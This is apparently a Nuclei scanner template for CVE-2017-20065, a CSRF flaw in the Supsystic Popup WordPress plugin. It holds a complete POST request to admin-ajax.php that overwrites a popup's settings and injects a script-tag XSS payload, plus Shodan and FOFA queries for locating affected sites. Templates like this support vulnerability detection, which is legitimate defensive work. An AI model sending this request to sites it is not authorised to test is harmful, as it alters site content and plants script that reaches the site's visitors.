id: CVE-2017-20065

info:
  name: Supsystic Popup Plugin CSRF Vulnerability
  author: ProjectDiscoveryAI
  severity: medium
  description: Cross-Site Request Forgery (CSRF) vulnerability in Supsystic Popup Plugin 1.7.6 allows attackers to execute arbitrary code via crafted POST requests.
  impact: |
    An attacker can exploit this vulnerability to perform unauthorized actions on behalf of the user.
  remediation: |
    Update the Supsystic Popup Plugin to the latest version to mitigate the CSRF vulnerability (CVE-2017-20065).
  reference:
    - http://seclists.org/fulldisclosure/2017/Feb/97
    - https://map.httpcs.com/alert/284665
    - https://vuldb.com/?id.97385
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N
    cvss-score: 4.3
    cve-id: CVE-2017-20065
    cwe-id: CWE-352
    epss-score: 0.00178
    epss-percentile: 0.5616
    cpe: cpe:2.3:a:supsystic:popup:1.7.6:*:*:*:*:wordpress:*:*
  metadata:
    vendor: supsystic
    product: popup
    framework: wordpress
    shodan-query: http.html:"/wp-content/plugins/popup-by-supsystic"
    fofa-query: body=/wp-content/plugins/popup-by-supsystic
    publicwww-query: /wp-content/plugins/popup-by-supsystic

http:
  - method: POST
    path:
      - "{{BaseURL}}/wp-admin/admin-ajax.php"

    body: |
      params[main][show_on]=page_load&params[main][show_on_page_load_delay]=&ppsCopyTextCode=[supsystic-show-popup id=100]&ppsCopyTextCode=onclick="ppsShowPopup(100); return false;"&params[main][show_on_click_on_el_delay]=0&params[main][show_on_scroll_window_delay]=0&params[main][show_on_scroll_window_perc_scroll]=0&params[main][show_on_link_follow_delay]=0&params[main][close_on]=user_close&params[main][show_pages]=all&params[main][show_time_from]=12:00am&params[main][show_time_to]=12:00am&params[main][show_date_from]=&params[main][show_date_to]=&params[main][show_to]=everyone&params[main][show_to_first_time_visit_days]=30&params[main][show_to_until_make_action_days]=30&params[main][count_times_num]=1&params[main][count_times_mes]=day&params[main][hide_for_devices_show]=0&params[main][hide_for_post_types_show]=0&params[main][hide_for_ips_show]=0&params[main][hide_for_ips]=&params[main][hide_for_countries_show]=0&params[main][hide_for_languages_show]=0&params[main][hide_search_engines_show]=0&params[main][hide_preg_url_show]=0&params[main][hide_preg_url]=&params[main][hide_for_user_roles_show]=0&params[tpl][width]=400&params[tpl][width_measure]=px&params[tpl][bg_overlay_opacity]=0.5&params[tpl][bg_type_0]=color&params[tpl][bg_img_0]=&params[tpl][bg_color_0]=#8c7764&params[tpl][bg_type_1]=color&params[tpl][bg_img_1]=&params[tpl][bg_color_1]=#75362c&params[tpl][font_label]=default&params[tpl][label_font_color]=#ffffff&params[tpl][font_txt_0]=default&params[tpl][text_font_color_0]=#f9e6ce&params[tpl][font_footer]=default&params[tpl][footer_font_color]=#585858&params[tpl][responsive_mode]=def&params[tpl][reidrect_on_close]=&params[tpl][close_btn]=while_close&params[tpl][bullets]=lists_green&layered_style_promo=1&params[tpl][layered_pos]=&params[tpl][enb_label]=1&params[tpl][label]=SIGN UP to our Newsletter!&params[tpl][enb_txt_0]=1&params_tpl_txt_0=<p>Popup by Supsystic lets you easily create elegant overlapping windows with unlimited features. Pop-ups with Slider, Lightbox, Contact and Subscription forms and more</p>&params[tpl][foot_note]=We respect your privacy. Your information will not be shared with any third party and you can unsubscribe at any time&params[tpl][enb_sm_facebook]=1&params[tpl][enb_sm_googleplus]=1&params[tpl][enb_sm_twitter]=1&params[tpl][sm_design]=boxy&params[tpl][anim_key]=none&params[tpl][anim_duration]=&params[tpl][enb_subscribe]=1&params[tpl][sub_dest]=wordpress&params[tpl][sub_wp_create_user_role]=subscriber&params[tpl][sub_aweber_listname]=&params[tpl][sub_aweber_adtracking]=&params[tpl][sub_mailchimp_api_key]=&params[tpl][sub_mailchimp_groups_full]=&test_email=canzihazcandy@gmail.com&params[tpl][sub_fields][name][enb]=1&params[tpl][sub_fields][name][name]=name&params[tpl][sub_fields][name][html]=text&params[tpl][sub_fields][name][label]=Name&params[tpl][sub_fields][name][value]=&params[tpl][sub_fields][name][custom]=0&params[tpl][sub_fields][name][mandatory]=0&params[tpl][sub_fields][email][name]=email&params[tpl][sub_fields][email][html]=text&params[tpl][sub_fields][email][label]=E-Mail&params[tpl][sub_fields][email][value]=&params[tpl][sub_fields][email][custom]=0&params[tpl][sub_fields][email][mandatory]=1&params[tpl][sub_fields][email][enb]=1&params[tpl][sub_txt_confirm_sent]=Confirmation link was sent to your email address. Check your email!&params[tpl][sub_txt_success]=Thank you for subscribe!&params[tpl][sub_txt_invalid_email]=Empty or invalid email&params[tpl][sub_txt_exists_email]=Empty or invalid email&params[tpl][sub_redirect_url]=&params[tpl][sub_txt_confirm_mail_subject]=Confirm subscription on [sitename]&params[tpl][sub_txt_confirm_mail_from]=admin@mail.com&params[tpl][sub_txt_confirm_mail_message]=You subscribed on site <a href="[siteurl]">[sitename]</a>. Follow <a href="[confirm_link]">this link</a> to complete your subscription. If you did not subscribe here - just ignore this message.&params[tpl][sub_txt_subscriber_mail_subject]=[sitename] Your username and password&params[tpl][sub_txt_subscriber_mail_from]=admin@mail.com&params[tpl][sub_txt_subscriber_mail_message]=Username: [user_login]<br />Password: [password]<br />[login_url]&params[tpl][sub_redirect_email_exists]=&params[tpl][sub_btn_label]=SIGN UP&params[tpl][sub_new_email]=admin&@mail.com&params[tpl][sub_new_subject]=New Subscriber on Summer of Pwnage&params[tpl][sub_new_message]=You have new subscriber on your site <a href="[siteurl]">[sitename]</a>, here us subscriber information: <br />[subscriber_data]&stat_from_txt=&stat_to_txt=&css=&html=<link rel="stylesheet" type="text/css" href="//fonts.googleapis.com/css?family=Amatic+SC" /> <script>alert("xss")</script> <div id="ppsPopupShell_[ID]" class="ppsPopupShell ppsPopupListsShell"> <a href="#" class="ppsPopupClose ppsPopupClose_[close_btn]"></a> <div class="ppsInnerTblContent"> <div class="ppsPopupListsInner ppsPopupInner"> [if enb_label] <div class="ppsPopupLabel ppsPopupListsLabel">[label]</div> [endif] <div style="clear:both;"></div> [if enb_txt_0] <div class="ppsPopupTxt ppsPopupClassyTxt ppsPopupClassyTxt_0 ppsPopupTxt_0"> [txt_0] </div> [endif] [if enb_subscribe] <div class="ppsSubscribeShell"> [sub_form_start] [sub_fields_html] <input type="submit" name="submit" value="[sub_btn_label]" /> [sub_form_end] <div style="clear:both;"></div> </div> [endif] <div style="clear:both;"></div> <div class="ppsRightCol"> [if enb_sm] <div style="clear:both;"></div> <div class="ppsSm"> [sm_html] </div> [endif] [if enb_foot_note] <div class="ppsFootNote"> [foot_note] </div> [endif] </div> </div> </div> </div>&params[opts_attrs][bg_number]=2&params[opts_attrs][txt_block_number]=1&mod=popup&action=save&id=100&params_tpl_txt_val_0=<p>Popup by Supsystic lets you easily create elegant overlapping windows with unlimited features. Pop-ups with Slider, Lightbox, Contact and Subscription forms and more</p>&pl=pps&reqType=ajax

    headers:
      Content-Type: application/x-www-form-urlencoded
    matchers:
      - type: word
        words:
          - "Thank you for subscribe!"
          - "Confirmation link was sent to your email address. Check your email!"
        part: body
